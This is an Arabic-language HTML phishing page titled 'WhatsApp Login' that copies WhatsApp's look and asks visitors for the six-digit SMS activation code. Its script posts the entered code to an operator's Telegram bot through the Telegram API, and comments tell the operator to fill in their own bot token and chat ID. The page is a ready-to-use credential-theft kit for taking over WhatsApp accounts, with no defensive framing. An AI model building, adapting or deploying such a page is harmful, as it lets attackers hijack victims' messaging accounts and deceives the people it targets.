<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .container h1 {
            font-size: 26px;
            color: #333;
            margin-bottom: 15px;
        }

        .container p {
            font-size: 16px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.6;
        }

        .container input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 8px;
            margin-bottom: 15px;
            box-sizing: border-box;
        }

        .container input:focus {
            outline: none;
            border-color: #25D366;
            box-shadow: 0 0 5px rgba(37, 211, 102, 0.5);
        }

        .container button {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .container button:hover {
            background-color: #1DA955;
        }

        #countdown {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>تسجيل الدخول</h1>
        <p>أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.</p>
        <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
        <button onclick="startVerification()">متابعة</button>
        <div id="countdown"></div>
    </div>

    <script>
        function startVerification() {
            const activationCodeInput = document.getElementById('activationCode');
            const activationCode = activationCodeInput.value;

            if (!activationCode || activationCode.length !== 6 || !/^\d{6}$/.test(activationCode)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            sendCodeToTelegram(activationCode);
        }

        function sendCodeToTelegram(code) {
            // استبدل القيم أدناه بالقيم الخاصة بك
            const botToken = 'YOUR_BOT_TOKEN'; // ضع هنا رمز التوكن الخاص بالبوت
            const chatId = 'YOUR_CHAT_ID'; // ضع هنا رقم الـ Chat ID الخاص بك
            const message = `رمز التفعيل: ${code}`;

            // إرسال الطلب إلى Telegram API
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then((response) => {
                    if (response.ok) {
                        alert('تم إرسال الرمز بنجاح إلى تيليجرام!');
                    } else {
                        alert('حدث خطأ أثناء الإرسال. تحقق من الإعدادات.');
                    }
                })
                .catch((error) => {
                    console.error('فشل الاتصال بـ Telegram API:', error);
                    alert('فشل الإرسال. تحقق من اتصالك بالإنترنت.');
                });
        }
    </script>
</body>

</html>
